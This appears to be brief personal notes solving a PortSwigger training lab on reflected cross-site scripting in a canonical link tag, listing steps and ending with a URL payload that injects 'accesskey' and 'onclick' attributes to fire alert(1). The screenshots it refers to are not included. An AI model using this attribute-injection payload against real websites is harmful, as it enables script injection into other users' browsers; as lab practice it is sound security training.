>> platform -> portswigger
>>> #### target -> Lab: Reflected XSS in canonical link tag

----
**Where is vuln in url endpoint**
**Goal alert(1)**

----


###  steps:
1. #### open the Lab.
  -  trigger simple hello ![alt text](image.png)
2. -> try this ![alt text](image-1.png)
3. -> bypass this
```javascript
?'accesskey='x'onclick='alert(1)
```
1. ![alt text](image-2.png) payload hit........
2. lab solve.....
